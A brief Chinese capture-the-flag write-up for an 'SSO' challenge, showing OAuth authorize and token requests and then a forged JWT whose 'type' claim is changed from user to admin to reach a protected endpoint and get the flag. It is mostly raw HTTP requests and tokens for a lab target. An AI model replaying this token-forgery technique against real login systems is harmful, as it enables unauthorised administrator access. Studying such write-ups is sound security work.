# SSO

跟着走oauth流程

## 0x01
request
```
POST /oauth2/authorize
Content-Type: application/x-www-form-urlencoded

response_type=code
```

response
```
Redirecting to <a href="undefined?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&amp;state=">undefined?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&state=</a>
```

## 0x02
request
```
POST /oauth2/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&state=&redirect_uri=http://example.com/
```

response
```
{"token_type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzAxNjYxOCwiZXhwIjoxNTM3MDE3MjE4fQ.iQ3yQU7ocIPMPaZEGiCL_fqzxW-tqV4ywt0LvPiSJrU"}
```

## 0x03
这里的 jwt 解码后发现是

![](./1.png)

将 type 改为admin得到新的jwt

request
```
GET /protected HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcwMTY2MTgsImV4cCI6MTUzNzAxNzIxOH0.Q85qkVmTu6xxeabjyT3dbXSBqJ1bSAfw9pNd5s4L4-A
```

返回flag